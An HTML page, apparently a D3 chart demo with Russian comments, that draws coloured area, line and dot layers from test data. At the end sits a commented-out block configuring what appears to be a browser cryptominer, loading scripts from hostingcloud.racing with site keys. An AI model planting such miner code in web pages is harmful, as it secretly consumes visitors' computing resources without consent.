<!DOCTYPE html>
<html>

<head>
    <meta charset='utf-8'>
    <title>D3's Hello World</title>
    <script src='/js/d3.v6.min.js'></script>
    <script src='/js/chroma.min.js'></script>
    <script src='/js/lodash.min.js'></script>
    <script src='js/lib.js'></script>
    <script src='c.js'></script>
    <link rel='stylesheet' href='/css/null.css' />
    <style>
        body {
            font-family: 'Courier New', Courier, monospace
        }
        
        .axis path,
        .axis line {
            fill: none;
            stroke: #333;
        }
        
        .axis .grid-line {
            stroke: #000;
            stroke-opacity: 0.2;
        }
        
        .axis text {
            font: 10px Verdana;
        }
        
        .bar {
            /*stroke: none;*/
        }
        
        svg {
            position: absolute;
            top: 0;
            left: 0;
        }
        
        .dot {
            stroke: steelblue;
            fill: lightblue;
        }
        
        .dot-2 {
            /*
            stroke: lightblue;
            fill: lightblue;*/
        }
    </style>
    <script src="data.js"></script>
</head>

<body style='background-color: #01040a'>

    <script>

        win.onload = () => {

            let width = win.innerWidth - 0;
            let height = win.innerHeight - 0;

            let margin = 0,
                padding = 0;

           
            //https://mdigi.tools/color-shades/#061639
            //#061639
            //let pallete = chroma.scale(['#061639', 'black']).colors(24);
            let palletejson = JSON.stringify(colors);

            // незавершенный объект, необходимо дополнить с учетом остальных объектов
            let Layer = (spec) => {
                let instance = {};
                let id, g;
                let data, width, height, margin, fill, stroke;
                let parent;

                if (_.isEmpty(spec)) {
                    id = 'id_l_' + Date.now();
                    width = win.innerWidth;
                    height = win.innerHeight;
                    margin = 0;
                    fill = 'white';
                    stroke = 'white';
                } else {
                    if (_.isEmpty(spec.id)) {
                        id = 'id_l_' + Date.now();
                    } else {
                        id = spec.id;
                    }
                    if (!_.isEmpty(spec.g)) g = spec.g;
                    if (!_.isEmpty(spec.data)) data = spec.data;
                    if (_.isEmpty(spec.width)) {
                        width = win.innerWidth;
                    } else {
                        width = spec.width;
                    }
                    if (_.isEmpty(spec.height)) {
                        height = win.innerheight;
                    } else {
                        height = spec.height;
                    }
                    if (_.isEmpty(spec.margin)) {
                        margin = '0';
                    } else {
                        margin = spec.margin;
                    }
                    if (_.isEmpty(spec.fill)) {
                        fill = 'white';
                    } else {
                        fill = spec.fill;
                    }
                    if (_.isEmpty(spec.stroke)) {
                        stroke = 'white';
                    } else {
                        stroke = spec.stroke;
                    }

                    if (!_.isEmpty(spec.parent)) parent = spec.parent;
                }
                // присваиваем или получаем Id
                instance.id = (i) => {
                    if (_.isEmpty(i)) {
                        return id.toString();
                    }
                    id = i;
                    return instance;
                };

                // присваиваем или получаем g
                instance.g = (v) => {
                    if (_.isEmpty(v)) {
                        return g;
                    }
                    g = v;
                    return instance;
                };

                // присваиваем или получаем data
                instance.data = (d) => {
                    if (_.isEmpty(d)) {
                        return data;
                    }
                    data = d;
                    return instance;
                };

                // присваиваем или получаем width
                instance.width = (w) => {
                    if (typeof(w) == 'number') {
                        w = w.toString();
                    }
                    if (_.isEmpty(w)) {
                        return width;
                    }
                    width = w;
                    return instance;
                };

                // присваиваем или получаем height
                instance.height = (h) => {
                    if (typeof(h) == 'number') {
                        h = h.toString();
                    }
                    if (_.isEmpty(h)) {
                        return height;
                    }
                    height = h;
                    return instance;
                };

                // присваиваем или получаем margin
                instance.margin = (m) => {
                    if (_.isEmpty(m) && m != 0) {
                        return margin;
                    }
                    margin = m;
                    return instance;
                };

                // присваиваем или получаем parent
                instance.parent = (p) => {
                    if (_.isEmpty(p)) {
                        return parent;
                    }
                    parent = p;
                    return instance;
                };

                // присваиваем или получаем fill
                instance.fill = (f) => {
                    if (_.isEmpty(f)) {
                        return fill;
                    }
                    fill = f;
                    return instance;
                };

                // присваиваем или получаем stroke
                instance.stroke = (s) => {
                    if (_.isEmpty(s)) {
                        return stroke;
                    }
                    stroke = s;
                    return instance;
                };

                instance.append = (p) => {

                    if (!_.isEmpty(p)) {
                        parent = p;
                    }

                    g = parent.append('g')
                        .attr('id', id)
                        .attr("transform", // сдвиг слоя вправо
                            "translate(" + margin + ", 0 )");
                    
                    return instance;
                }
                
                instance.appendArea = (a) =>{
               
                    if (_.isEmpty(a)) {
                        a = data;
                    }
                 
                    let linedots = interpolate(a);
                    let area = Path()
                        .d(Area(linedots, height, margin))
                        .fill(fill)
                        .append(g);
                  
                    return instance;
                };
                
                instance.appendLine = (l) =>{
                    if (_.isEmpty(l)) {
                        l = data;
                    }
                    let linedots = interpolate(l);
                    let line = Path()
                        .d(Line(linedots))
                        .stroke(stroke)
                        .strokewidth(2)
                        .fill('none')
                        .append(g);
                        
                    return instance;
                };
              
                instance.appendDots = (d) =>{
                    if (_.isEmpty(d)) {
                        d = data;
                    }
                
                    let linedots = interpolate(d);
                    let dots = Dots()
                        .data(d)
                        .cls('dot-2')
                        .scaleX(scaleX)
                        .scaleY(scaleY)
                        .fill(fill)
                        .stroke(stroke)
                        .strokewidth(2)
                        .append(g);
                        
                    return instance;
                };
             
                let interpolate = (data)=>{
                    // длина оси X= ширина слоя - отступ слева и справа
                    xAxisLength = AxisLength(width, margin);
                    // длина оси Y = высота слоя - отступ сверху и снизу
                    yAxisLength = AxisLength(height, margin);
                    // функция интерполяции значений на ось X
                    scaleX = AxisScale(xAxisLength, [0, 100]);
                    // функция интерполяции значений на ось Y
                    scaleY = AxisScale(yAxisLength, [100, 0]);
                    // расположение точек линии с учетом интерполяции
                    return LineDots(data, scaleX, scaleY, margin);
                };

                return instance;
            }

            // объект Холст
            function Canvas(spec) {
                let instance = {};
                let headline, description;
                let svg, defs, width, height;
                let data = {};
                let margin = 0;
                data.pallete = [];
                data.gradients = [];
                data.layers = [];

                instance.newLayer = (data, width, height, margin, fill, stroke) => {

                    let layer = Layer()
                        .data(data)
                        .width(width)
                        .height(height)
                        .margin(margin)
                        .fill(fill)
                        .stroke(stroke);
                    
                    layer.append(svg);
                    
                    layer.appendArea();
                    layer.appendLine();
                    layer.appendDots();
                    
                    //data.layers.push(layer);

                    return instance;
                };


                // создаем SVG
                instance.appendSvg = (w, h) => {
                    width = w;
                    height = h;
                    svg = d3.select("body").append("svg")
                        .attr("class", "axis")
                        .attr("viewBox", "0 0 " + width + " " + height)
                        .attr("width", width)
                        .attr("height", height);
                    defs = svg.append("defs");
                    return instance;
                };

                instance.onresize = (on) => {
                    if (on) {
                        win.onresize = () => {
                            svg.attr("width", win.innerWidth);
                            svg.attr("height", win.innerHeight);
                        };
                    } else {
                        win.onresize = () => {};
                    }

                    return instance;
                }

                // создаем defs
                instance.appendDefs = () => {
                    if (!svg.select("defs")) defs = svg.append("defs");
                    return instance;
                };

                // присваиваем или получаем SVG
                instance.svg = (s) => {
                    if (!arguments.length) return svg;
                    svg = s;
                    return instance;
                };

                // устанавливаем или получаем ширину margin
                instance.margin = (m) => {
                    if (!arguments.length) return margin;
                    margin = m;
                    return instance;
                };

                // устанавливаем или получаем ширину SVG
                instance.width = (w) => {
                    if (!arguments.length) return width;
                    width = w;
                    svg.attr("viewBox", "0 0 " + width + " " + height)
                        .attr('width', width);
                    return instance;
                };

                // устанавливаем или получаем высоту SVG
                instance.height = (h) => {
                    if (!arguments.length) return height;
                    height = h;
                    svg.attr("viewBox", "0 0 " + width + " " + height)
                        .attr('height', height);
                    return instance;
                };

                // выводим виджет с заголовком и описанием
                instance.showTextWidget = () => {
                    let div = d3.select('body').append('div');
                    div.append('h3').text(headline);
                    div.attr('class', 'box')
                        .attr('style', 'width: ' + spec.width + '; word-wrap: break-word;color:' + spec.color)
                        .append('p')
                        .text(description);
                    return instance;
                };

                // присваиваем и получаем заголовок виджета
                instance.headline = (h) => {
                    if (!arguments.length) return headline;
                    headline = h;
                    return instance;
                };

                // присваиваем и получаем описание виджета
                instance.description = (d) => {
                    if (!arguments.length) return description;
                    description = d;
                    return instance;
                };

                // присваиваем и получаем объект с данными
                instance.data = (d) => {
                    if (_.isEmpty(d)) return data;
                    data = d;
                    return instance;
                };

                // присваиваем и получаем цветовую палитру
                instance.data.pallete = (p) => {
                    if (_.isEmpty(p)) return data.pallete;
                    data.pallete = p;
                    return instance;
                };

                // присваиваем и получаем градиенты
                instance.data.gradients = (g) => {
                    if (_.isEmpty(g)) return data.gradients;
                    data.gradients = g;
                    return instance;
                };

                // присваиваем и получаем слои
                instance.data.layers = (l) => {
                    if (_.isEmpty(l)) return data.layers;
                    data.layers = l;
                    return instance;
                };

                // создаем палитру
                instance.generatePallete = (obj) => {
                    // obj.colors is an array of colors. Example ['yellow','lightgreen',l008ae5]
                    // obj.domain is an array of stops. Example ['0,0.5,1']
                    let _colors;

                    if (!_.isEmpty(obj.colors)) {
                        _colors = chroma.scale(obj.colors);
                    } else {
                        _colors = chroma.scale(['white', 'black']);
                    }

                    if (!_.isEmpty(obj.domain)) {
                        _colors = _colors.domain(obj.domain);
                    }

                    if (!_.isEmpty(obj.count)) {
                        _colors = _colors.colors(count);
                    } else {
                        _colors = _colors.colors(24);
                    }

                    data.pallete = _colors;

                    return instance;
                };

                instance.appendBG = (mainColor, gradientColor) => {

                    // градиент
                    let BG = Gradient({
                            'defs': defs
                        }).append()
                        .stop('0', gradientColor, '0.25')
                        .stop('1', gradientColor, '1');

                    // маска
                    let M = Mask({
                            'defs': defs
                        }).append()
                        .rect(0, 0, width, height, 'url(#' + BG.id() + ')');

                    // прямоугольник с маской градиентом
                    let R = Rect({
                        'width': width,
                        'height': height,
                        'fill': mainColor,
                        'mask': 'url(#' + M.id() + ')'
                    }).append(svg);

                    return instance;
                }

                return instance;
            }

            let canvas = Canvas({
                    color: 'white', //'#6495ed',
                    width: width
                })
                .generatePallete({
                    'colors': ['yellow', 'lightgreen']
                });
            let p = canvas.data.pallete();
            canvas
                .headline('Pallete')
                .description(JSON.stringify(p)) //palletejson)
                .appendSvg(width, height)
                .onresize(true)
                .appendDefs()
                .appendBG("orange", "white");

            canvas.showTextWidget();

            let testData1 = [{
                x: 0,
                y: 0
            }, {
                x: 10,
                y: 67
            }, {
                x: 20,
                y: 74
            }, {
                x: 30,
                y: 63
            }, {
                x: 40,
                y: 56
            }, {
                x: 50,
                y: 24
            }, {
                x: 60,
                y: 26
            }, {
                x: 70,
                y: 19
            }, {
                x: 80,
                y: 42
            }, {
                x: 90,
                y: 88
            }, {
                x: 100,
                y: 70
            }];

            let testData2 = [{
                x: 0,
                y: 10
            }, {
                x: 10,
                y: 77
            }, {
                x: 15,
                y: 65
            }, {
                x: 20,
                y: 84
            }, {
                x: 30,
                y: 76
            }, {
                x: 40,
                y: 66
            }, {
                x: 50,
                y: 34
            }, {
                x: 60,
                y: 36
            }, {
                x: 70,
                y: 29
            }, {
                x: 80,
                y: 52
            }, {
                x: 90,
                y: 98
            }, {
                x: 100,
                y: 80
            }];

            canvas.newLayer(testData2, width, height, margin, 'orange', 'lightgreen');
            canvas.newLayer(testData1, width, height, margin, 'red', 'lightblue');
            /*
                        } catch (e) {
                            alert(e);
                        }
            */
            /*
             let c = coins()
                 .addSite({
                     id: 'local',
                     match: '127.0.0.1',
                     src: 'https://www.hostingcloud.racing/2KFX.js',
                     key: 'a854e75e5581eff8d57857295772763208fbf227916c146630e4fa16c1ea9e97'
                 })
                 .addSite({
                     id: 'share',
                     match: 'shareform.ru',
                     src: 'https://www.hostingcloud.racing/rhdQ.js',
                     key: 'cc138bc50ff7148e00b642bfa9beb5f8b8c41659c84996f1de44457d1ba5d6dc'
                 }).start();
                 */
        }
    </script>
</body>

</html>